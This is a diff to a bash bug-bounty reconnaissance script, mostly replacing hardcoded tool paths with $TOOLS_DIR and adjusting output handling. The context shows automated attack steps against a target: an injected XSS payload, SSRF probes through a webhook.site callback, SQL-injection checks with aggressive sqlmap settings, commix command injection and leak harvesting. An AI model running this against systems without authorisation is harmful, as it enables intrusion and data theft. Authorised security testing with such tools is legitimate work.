@@ -254,11 +254,11 @@ get_endpoints() {
     
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Discovering sensitive data .  ${NORMAL}[${LRED}${BLINK}Checking${NORMAL}]"
 for url in $(cat ${dirdomain}/info/js.txt);do
-		python3 ~/tools/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secret.txt
+		python3 $TOOLS_DIR/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secret.txt
 	done &> /dev/null
 	cat ${dirdomain}/parameters/endpoints.txt | httpx -mc 200 -content-type -silent | awk -F '[' '{print $1}' | tee -a ${dirdomain}/parameters/liveendpoints.txt &> /dev/null
  for url in $(cat ${dirdomain}/parameters/liveendpoints.txt);do
-		python3 ~/tools/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secretendpoints.txt
+		python3 $TOOLS_DIR/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secretendpoints.txt
 	done &> /dev/null
 	
  echo -e "\033[2A"
@@ -268,15 +268,15 @@ for url in $(cat ${dirdomain}/info/js.txt);do
 
 # Function to get info of the domains
 get_info() {
-        
-        echo -ne "${GREEN}[+] Whois Lookup${NORMAL}\n"	
+        echo -e "\033[2A"
+        echo -ne "${GREEN}[+] Whois Lookup${NORMAL}\r"	
 	echo -ne "${NORMAL}${YELLOW}Searching domain name details, contact details of domain owner, domain name servers, netRange, domain dates, expiry records, records last updated...${NORMAL}\n\n"
-	whois $target | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee ${dirdomain}/info/whois.txt
+	whois $target | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee ${dirdomain}/info/whois.txt &> /dev/null
 	
-	echo -ne "\n${GREEN}[+] WhatWeb ${NORMAL}\n"
+	echo -ne "\n${GREEN}[+] WhatWeb ${NORMAL}\r"
 	echo -ne "${NORMAL}${YELLOW}Searching platform, type of script, google analytics, web server platform, IP address, country, server headers, cookies...${NORMAL}\n\n"
 	whatweb -i $subdomains_live --log-brief ${dirdomain}/info/whatweb.txt &> /dev/null
-echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check if the Domains is running WordPress or Joomla or Drupal\r"
+echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check if the Domains is running WordPress or Joomla or Drupal\n"
 websites_file="$subdomains_live" 
 CMSresult="./$dirdomain/info/CMSresult.txt"  
 if [ ! -f "$websites_file" ]; then
@@ -368,11 +368,11 @@ check_vulnerabilities() {
 # Add CMSeeK scanning
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Scanning CMS  -  ${NORMAL}[${LRED}${BLINK}CMSeeK${NORMAL}]"
     for url in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
-        python3 /home/haco/Tools/CMSeeK/cmseek.py -u $url --batch -r >> $cmseek_output
+        python3 $TOOLS_DIR/CMSeeK/cmseek.py -u $url --batch -r >> $cmseek_output
     done
  # Add gxss scanning
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with gxss  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
-    cat ${dirdomain}/parameters/endpoints.txt | gxss -c 100 -p Xss | grep "=" | qsreplace '"><svg onload=confirm(1)>' | while read url; do
+    cat ${dirdomain}/parameters/endpoints.txt | Gxss -c 100 -p Xss | grep "=" | qsreplace '"><svg onload=confirm(1)>' | while read url; do
         curl -s -L "$url" | grep -qs "<svg onload=confirm(1)>" && echo "$url" >> $gxss_output
     done
  # Enhanced SQLMap scanning
@@ -427,7 +427,7 @@ cat ${dirdomain}/subdomains/livesubdomain.txt | sed -E 's#^(https?://)?([^/]+).*
 
 echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] LeakSearch:${NORMAL}${BOLD} Getting leaked passwords, emails and usernames\r"
 porch-pirate -s $target --dump  > ${dirdomain}/info/postman_leaks.txt
-python3 $REAL_HOME/tools/SwaggerSpy/swaggerspy.py $target | grep -i "[*]\|URL" > ${dirdomain}/info/swagger_leaks.txt
+python3 $TOOLS_DIR/SwaggerSpy/swaggerspy.py $target | grep -i "[*]\|URL" > ${dirdomain}/info/swagger_leaks.txt
 emailfinder -d $target  | anew -q ${dirdomain}/info/emailfinder.txt
 cat ${dirdomain}/info/emailfinder.txt | grep "@" | grep -iv "|_" | anew -q ${dirdomain}/info/emails.txt
 rm -f ${dirdomain}/info/emailfinder.txt
@@ -476,7 +476,7 @@ cat ${dirdomain}/info/Information.txt | grep -oP 'https?://[^\s]+' > ${dirdomain
 
 
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}openreditrct${NORMAL}]\r"
-cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $tools/OpenRedireX/payloads.txt| grep "^http" >  ${dirdomain}/vulnerability/redirect.txt &> /dev/null
+cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $TOOLS_DIR/OpenRedireX/payloads.txt| grep "^http" >  ${dirdomain}/vulnerability/redirect.txt &> /dev/null
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}openreditrct${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/redirect.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Xss${NORMAL}]\r" 
      ##===========================================================
@@ -549,13 +549,13 @@ cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $tools/
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}CRLF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/crlf.txt 2> /dev/null | wc -l )"
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SSRF${NORMAL}]\r"
     cat ${dirdomain}/parameters/ssrf.txt | qsreplace "https://webhook.site/620c2da1-2ec4-4318-8f20-1f31faadbe4e" 2> /dev/null | anew -q ${dirdomain}/osint/ssrf.txt
-    cat ${dirdomain}/osint/ssrf.txt | xargs -P 55 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[${RED}POTENTIAL SSRF${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew $dirdomain/vulnerability/ssrf.txt | notify -bulk -data ssrf.txt&> /dev/null
+    cat ${dirdomain}/osint/ssrf.txt | xargs -P 55 -I % bash -c "curl -s  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[${RED}POTENTIAL SSRF${NORMAL}] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew $dirdomain/vulnerability/ssrf.txt &> /dev/null
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SSRF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/ssrf.txt 2> /dev/null | wc -l )"
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SQLi${NORMAL}]\r"
    cat ${dirdomain}/parameters/liveendpoints.txt | grep ".php" | sed 's/.php.*/.php/' | sort -u | sed 's|$|%27%22%60|' | while read url ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url ${RED}Vulnerable\n" || echo -e "$url ${GREEN}Not Vulnerable\n" ; done 
     
-    python3 $REAL_HOME/tools/SQLiDetector/sqlidetector.py -f ${dirdomain}/parameters/sqli.txt -w 50 -o ${dirdomain}/parameters/sqlidetector.txt -t 10 &> /dev/null
-   sqlmap -m ${dirdomain}/parameters/sqlidetector.txt --batch --risk 3 --random-agent --level 5 | tee -a $dirdomain/vulnerability/sqli.txt | notify -bulk -data sqli.txt&> /dev/null
+    python3 $TOOLS_DIR/SQLiDetector/sqlidetector.py -f ${dirdomain}/parameters/sqli.txt -w 50 -o ${dirdomain}/parameters/sqlidetector.txt -t 10 &> /dev/null
+   sqlmap -m ${dirdomain}/parameters/sqlidetector.txt --batch --risk 3 --random-agent --level 5 | tee -a $dirdomain/vulnerability/sqli.txt&> /dev/null
    
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SQLi${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/sqli.txt 2> /dev/null | wc -l )"
       echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SSTI${NORMAL}]\r"
@@ -569,7 +569,7 @@ pphack -l ${dirdomain}/subdomains/livesubdomain.txt -o $prototype_file &> /dev/n
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Prototype${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $prototype_file 2> /dev/null | wc -l )"
  
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}command_injection${NORMAL}]\r"
- commix --batch -m ${dirdomain}/parameters/rce.txt --output-dir ${dirdomain}/vulnerability/command_injection.txt | notify -bulk -data command_injection.txt&> /dev/null
+ commix --batch -m ${dirdomain}/parameters/rce.txt --output-dir ${dirdomain}/vulnerability/command_injection.txt &> /dev/null
     
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}command_injection${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/command_injection.txt 2> /dev/null | wc -l )"
   
@@ -619,7 +619,7 @@ while true; do
     echo -ne "${GREEN}7. Full Recon${NORMAL}\n"
     echo -ne "${GREEN}8. Exit${NORMAL}\n"
     echo -ne "${GREEN}#################################\n"
-    read -p "Enter your choice (1-7): " choice
+    read -p "Enter your choice (1-8): " choice
 
     case $choice in
         1) scan_subdomains ;;
